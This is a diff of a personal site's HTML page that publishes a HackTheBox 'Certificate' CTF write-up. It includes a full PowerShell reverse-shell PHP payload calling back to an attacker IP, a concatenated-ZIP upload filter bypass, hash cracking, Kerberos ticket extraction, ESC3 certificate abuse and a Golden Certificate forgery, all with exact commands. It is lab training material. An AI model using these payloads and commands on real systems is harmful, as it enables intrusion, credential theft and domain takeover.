@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Certificate - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Certificate.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Certificate machine from HackTheBox - Hard difficulty level">
+    <meta name="description" content="Detailed writeup for Certificate machine from HackTheBox - Hard difficulty level">
     <meta name="keywords" content="HackTheBox, Certificate, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,217 @@
         <h1 class="writeup-title">Certificate</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active machine</span>
+            <span class="date">October 4, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Certificate" src="../images/Certificate/pwned.png" /></p>
-<p>Certificate is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Certificate retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Certificate/pwned.png" /></p>
+<p>Certificate was a hard-difficulty Windows Active Directory box that began with web application enumeration revealing an upload functionality accessible through quiz submission IDs.
+I exploited a file upload filter by creating concatenated ZIP archives, merging a legitimate PDF archive with a malicious one containing a PHP reverse shell, which bypassed content validation and granted initial access as a low-privileged web user.
+Database enumeration revealed MySQL credentials in the web application's configuration file, allowing me to dump user hashes from the Certificate_WEBAPP_DB database and crack Sara.B's password as "Blink182".</p>
+<p>Using Sara.B's credentials via WinRM, I discovered a PCAP file documenting workstation connectivity issues, which I analyzed using Krb5RoastParser to extract and crack AS-REQ Kerberos tickets, revealing Lion.SK's password as "!QAZ2wsx".
+Post-compromise enumeration revealed Lion.SK belonged to the Domain CRA Managers group, which could enroll in the Delegated-CRA certificate template vulnerable to ESC3 (Certificate Request Agent EKU enabled).
+I exploited ESC3 by requesting a Certificate Request Agent certificate for Lion.SK, then used it to request a certificate on behalf of Ryan.K through the SignedUser template, obtaining Ryan.K's NTLM hash via PKINIT authentication.</p>
+<p>Ryan.K possessed the SeManageVolumePrivilege, which I abused using FSCTL_SD_GLOBAL_CHANGE to globally replace the Administrators group SID (S-1-5-32-544) with the Users group SID (S-1-5-32-545) in file permissions, effectively granting my unprivileged user administrative access to protected files.
+With elevated file access, I used certutil to export the Certificate Authority's private key from the machine's certificate store, then performed a Golden Certificate attack by forging an administrator certificate with certipy-ad, ultimately authenticating as Administrator and achieving full domain compromise.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Certificate/nmap.png" /></p>
+<p>Initial nmap scan reveals a standard set of ports for a domain controller, alongside two other (80 and 5985) ports.</p>
+<h2>Website enumeration</h2>
+<p><img alt="website" src="../images/Certificate/website.png" /></p>
+<p>There are a few accessible pages here, and the one I'm interested in the most is the blog. I'll create an account first before exploring it.</p>
+<p><img alt="register" src="../images/Certificate/register.png" /></p>
+<p>Seems like I won't be able to use a teacher account in this case. After trying to log in with it, I'm left with a blank page.</p>
+<p>Instead, I'll create a regular student account.</p>
+<p><img alt="blog" src="../images/Certificate/blog.png" /></p>
+<p>There's not much on the blog page, aside from potential usernames to check later. With no leads to pursue, I'll use a fuzzer to search for files/directories.</p>
+<p>I'll start by using dirsearch to discover any .php files that I haven't seen on the website. I will specify <code>-e php</code> to focus only on .php files and decrease the wordlist size.</p>
+<p><code>dirsearch -u http://certificate.htb/ --exclude-sizes=304B -e php</code></p>
+<p><img alt="dirsearch" src="../images/Certificate/dirsearch.png" /></p>
+<p>There is a /upload.php page that's accessible only to authenticated users.</p>
+<p><img alt="notfound" src="../images/Certificate/notfound.png" /></p>
+<p>Since I haven't given it an SID, it returned a 404 error. I tried appending <code>?sid=X</code> in order to reach a quiz, but this didn't work.</p>
+<p>After some experimentation and changing the <code>sid</code>, I got a few hits with ffuf.</p>
+<p><img alt="ffuf" src="../images/Certificate/ffuf.png" /></p>
+<p>I used a simple wordlist consisting of numbers from 1 to 100, each on a separate line. It can be easily created with <code>seq 1 100 &gt; ids.txt</code> </p>
+<p>Accessing any of the IDs via <code>?s_id=ID</code> grants me access to an upload form.</p>
+<p><img alt="upload" src="../images/Certificate/upload.png" /></p>
+<h2>Filter bypass via concatenated ZIP archives</h2>
+<p>I tried uploading a zipped .xlsx file, but I got a 400 error(Bad request). However, uploading a zipped .pdf file was successful.</p>
+<p><img alt="success" src="../images/Certificate/success.png" /></p>
+<p>The link redirects to <code>http://certificate.htb/static/uploads/8cab52ee39a496bcb224cdb3e5d654d6/file.pdf</code>, which I can visit without problems.</p>
+<p><img alt="test" src="../images/Certificate/test.png" /></p>
+<p>I've tried a few tricks here like XSS, redirecting to other pages, and more. I never got any sort of callback/confirmation though, so I'm assuming it did not work.</p>
+<p>I then moved my focus from the restricted extensions to the ZIP archive itself, and after a rather long search, I found a very interesting article.</p>
+<p><code>https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/</code></p>
+<p>To simplify, the idea is to create two ZIP archives. One "good" and one "malicious" with a shell.</p>
+<p>Then I'll cat both archives into a new one (final.zip).</p>
+<p>I'll do it in a few steps:</p>
+<ol>
+<li>Create a directory named  <code>evil</code> with shell.php inside(reverse shell)</li>
+</ol>
+<p>Note: the evil ZIP needs to contain a directory(malicious) with shell.php inside. This is a necessary step.</p>
+<ol>
+<li>
+<p>Create a second directory named <code>good</code> with the legitimate PDF file from before.</p>
+</li>
+<li>
+<p>Zip both directories.</p>
+</li>
+<li>
+<p>Concatenate(cat) both ZIP archives into one <code>final.zip</code>.</p>
+</li>
+</ol>
+<pre class="codehilite"><code>mkdir malicious
+
+-
+# This is what I'll put into the shell.php file
+
+&lt;?php
+shell_exec(&quot;powershell -nop -w hidden -c \&quot;\$client = New-Object Net.Sockets.TCPClient('10.10.16.13',9001); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2&gt;&amp;1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '&gt; '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\&quot;&quot;);
+?&gt;
+-
+
+zip -r evil.zip malicious
+
+zip good.zip file.pdf
+
+# Now we merge the two archives together. The malicious archive needs to be the second argument.
+
+cat good.zip evil.zip &gt; final.zip
+</code></pre>
+
+<p>Now I'll set up a listener on 9001, and I'll upload the merged final.zip archive.</p>
+<p><img alt="legit" src="../images/Certificate/legit.png" /></p>
+<p>The PDF has been displayed, but I'll switch the file.pdf to <code>malicious/shell.php</code> on the URL bar.</p>
+<p>After doing so, the website hung up, and I received a hit on my listener.</p>
+<p><img alt="shell" src="../images/Certificate/shell.png" /></p>
+<h2>Dumping the mysql database</h2>
+<p>Going down the directories, I eventually found a db.php file in <code>C:\xampp\htdocs\certificate.htb</code>.</p>
+<pre class="codehilite"><code>&lt;?php
+// Database connection using PDO
+try {
+    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
+    $db_user = 'certificate_webapp_user'; // Change to your DB username
+    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
+    $options = [
+        PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
+    ];
+    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
+} catch (PDOException $e) {
+    die('Database connection failed: ' . $e-&gt;getMessage());
+}
+?&gt;
+</code></pre>
+
+<p>There are credentials for a default database user inside, as well as the DB name.</p>
+<p>I found <code>C:\xampp\mysql\bin</code> as well, containing mysql executables which will allow me to dump the database.</p>
+<p><code>mysqldump.exe -u certificate_webapp_user -p cert!f!c@teDBPWD Certificate_WEBAPP_DB</code></p>
+<p>However, running this command within powershell outputs nothing. This is probably because of the "!" signs, so I'll try using it with cmd instead.</p>
+<p><code>cmd /c "mysqldump.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB"</code></p>
+<p><img alt="dbdump" src="../images/Certificate/dbdump.png" /></p>
+<p>This is much better, and I can identify a few hashes within the dump. I'll take the ones where <code>email = something@certificate.htb</code>, as these would most likely be used within the domain.</p>
+<pre class="codehilite"><code>Lora.AAA:$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
+sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
+</code></pre>
+
+<p>I'll use hashcat to crack the hashes.</p>
+<p><code>hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt --user</code></p>
+<p><img alt="cracked" src="../images/Certificate/cracked.png" /></p>
+<p>Now I will try authenticating with these credentials via netexec.</p>
+<p><img alt="correctlogin" src="../images/Certificate/correctlogin.png" /></p>
+<p><code>sara.b | Blink182</code></p>
+<p>Conveniently, Sara's credentials allow me to remote into the machine, providing a safe checkpoint from which I could continue.</p>
+<p><img alt="remote" src="../images/Certificate/remote.png" /></p>
+<p>In the WS-01 directory, there are two files. A text file <code>Description.txt</code>:</p>
+<pre class="codehilite"><code>The workstation 01 is not able to open the &quot;Reports&quot; smb shared folder which is hosted on DC01.
+When a user tries to input bad credentials, it returns bad credentials error.
+But when a user provides valid credentials the file explorer freezes and then crashes!
+</code></pre>
+
+<p>And a PCAP file, which I'll download onto my machine.</p>
+<p>One thing to remember is that pinging WS-01 returns a timeout, but reveals the machine's IP, which is <code>192.168.56.128</code></p>
+<h2>Investigating the PCAP file with Wireshark</h2>
+<p>I set the filter to <code>ip.src == 192.168.56.128</code>, which will filter out any packets that did not come from the WS-01 machine.</p>
+<p><img alt="logon" src="../images/Certificate/logon.png" /></p>
+<p>There were quite a lot of logon attempts for the user administrator, but there wasn't much I could get from them.</p>
+<h3>Extracting Kerberos tickets from the PCAP file</h3>
+<p>While scrolling through the packets, I found a bunch of KRB5 protocol packets containing data related to tickets requested by the user Lion.SK.</p>
+<p><img alt="asreqpiece" src="../images/Certificate/asreqpiece.png" /></p>
+<p>I searched for a way to extract kerberos tickets from a PCAP file online. The ticket data was strewn across many packets, which would make the manual way tedious(and maybe impossible) to pull through.</p>
+<p><code>https://github.com/jalvarezz13/Krb5RoastParser</code></p>
+<p>This script will seek out Kerberos tickets within a PCAP file and rebuild them so that they can be cracked with tools like hashcat or John the Ripper.</p>
+<p><code>python krb5_roast_parser.py ../WS-01_PktMon.pcap &lt;TICKET&gt;</code></p>
+<p><img alt="tickets" src="../images/Certificate/tickets.png" /></p>
+<p>I took the AS-REQ hash, and tried cracking it with hashcat.</p>
+<p><img alt="crack" src="../images/Certificate/crack.png" /></p>
+<p><code>Lion.SK | !QAZ2wsx</code></p>
+<p>With that, I'll try to remote into the machine as Lion.</p>
+<p><img alt="user" src="../images/Certificate/user.png" /></p>
+<h1>Root flag</h1>
+<p>With Lion.SK owned, I enumerated the machine manually, and found a way to privesc.</p>
+<h2>Abusing ESC3 to own Ryan.K</h2>
+<p><img alt="cra" src="../images/Certificate/cra.png" /></p>
+<p>Lion.SK is a member of the <code>Domain CRA Managers</code> group...</p>
+<p><img alt="vuln" src="../images/Certificate/vuln.png" /></p>
+<p>And members of that group can enroll in the <code>Delegated-CRA</code> certificate template, which is vulnerable to ESC3(<code>Template has Certificate Request Agent EKU set.</code>).</p>
+<p>Because of the <code>Certificate Request Agent</code> EKU, I will be able to request certificates on behalf of other users, after getting one for my user.</p>
+<p><code>certipy-ad req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'</code></p>
+<p><img alt="reqcert" src="../images/Certificate/reqcert.png" /></p>
+<p>Now I need to find a template that allows enrollment for domain users. For this, I'll rerun the certipy-ad find command and grep for the <code>Domain Users</code> string.</p>
+<p><img alt="templates" src="../images/Certificate/templates.png" /></p>
+<p>There are 2 fitting templates, SignedUser and KerberosAuthentication. The last thing I need is to find a user I could pivot to.</p>
+<p><img alt="users1" src="../images/Certificate/users1.png" /></p>
+<p>While looking through the machine, I took notice of what users were present within the system. I will try to request a certificate for the two remaining users.</p>
+<p>Requesting certs for the user <code>akeder.kh</code> failed with a <code>CERTSRV_E_SUBJECT_EMAIL_REQUIRED</code> error, but it was successful for Ryan.K.</p>
+<p><code>certipy-ad req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\Ryan.K'</code></p>
+<p><img alt="request" src="../images/Certificate/request.png" /></p>
+<p>Since I have a valid certificate, I can use certipy-ad to auth with it and get an NTLM hash for ryan.k.</p>
+<p><code>certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71</code></p>
+<p><img alt="hash" src="../images/Certificate/hash.png" /></p>
+<p>And with the hash, I can remote into the machine as Ryan.</p>
+<p><img alt="ryan" src="../images/Certificate/ryan.png" /></p>
+<h2>Abusing the SeManageVolumePrivilege for protected file access</h2>
+<p>I've never encountered this privilege before, so naturally, I've searched the web for more information about it.</p>
+<p>This privilege allows an attacker to access protected files like system hives by reading raw disk data, and potentially even destroy the system by writing directly to volumes. It is usually only necessary for system-level software, volume operations, or certain backup tasks.</p>
+<p><code>https://github.com/CsEnox/SeManageVolumeExploit</code></p>
+<p>The above exploit enables this privilege in my session token and uses the <code>FSCTL_SD_GLOBAL_CHANGE</code> control code to switch every instance of <code>S-1-5-32-544 (Administrators group)</code> with <code>S-1-5-32-545 (Users group)</code> for file permissions, effectively granting regular users administrative access to protected files.</p>
+<p>I ran the exploit, and tried to perform an operation on a protected file.</p>
+<p><img alt="elevated" src="../images/Certificate/elevated.png" /></p>
+<p>And while it worked, the hives are almost always being used by the system, which makes them impossible to get without the SeBackupPrivilege.</p>
+<p>There are other files I could get though, and the box's name certainly hints at one of them.</p>
+<h2>Exporting the CA's private key</h2>
+<p>My focus moved to the CA and its private key. I've exploited a certificate template vulnerability earlier, so I already know the CA's name. Even if I didn't, it would be trivial to check with certutil, which I will also be using for stealing the CA's key.</p>
+<p>First, I will see what kind of certificate sare stored in the CA's personal certificate store.</p>
+<p><code>certutil -store my 'Certificate-LTD-CA'</code></p>
+<p><img alt="store" src="../images/Certificate/store.png" /></p>
+<p>There is a single certificate... But these 3 lines are important.</p>
+<pre class="codehilite"><code>  Key Container = Certificate-LTD-CA
+  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+</code></pre>
+
+<p>This leads me to strongly believe that this certificate contains an exportable private key. Another reason why I'm inclined to believe that is the missing <code>Private key is NOT exportable</code> flag.</p>
+<p>CA certs are usually set as exportable so that they can be backed up and restored by administrators. On the other hand, the DC authentication certificates are often set as non-exportable due to security measures, as shown below.</p>
+<p><img alt="dccert" src="../images/Certificate/dccert.png" /></p>
+<hr />
+<p>Since the CA's store has only one certificate, I don't need to use the cert's serial number. It would be useful if there were multiple, but in this case, a single exportpfx command will pick out the sole cert.</p>
+<p><code>certutil -exportpfx my 'Certificate-LTD-CA' cacert.pfx</code></p>
+<p><img alt="export" src="../images/Certificate/export.png" /></p>
+<h2>Forging an administrator certificate - Golden certificate attack</h2>
+<p>Having the CA's private key allows me to forge certificates for ANY user on the domain. Obviously, the main target will be the administrator account.</p>
+<p><code>certipy-ad forge -ca-pfx cacert.pfx -upn Administrator@certificate.htb</code></p>
+<p>I set the UPN to the same value as the administrator's, so that the certificate will have a matching one. This will allow me to authenticate with the forged .pfx file.</p>
+<p><img alt="forged" src="../images/Certificate/forged.png" /></p>
+<p>Now I'll authenticate to the domain with the newly forged .pfx.</p>
+<p><code>certipy-ad auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71</code></p>
+<p><img alt="hashadmin" src="../images/Certificate/hashadmin.png" /></p>
+<p>This returns an NTLM hash, with which I can remote into the machine as the administrator.</p>
+<p><img alt="root" src="../images/Certificate/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
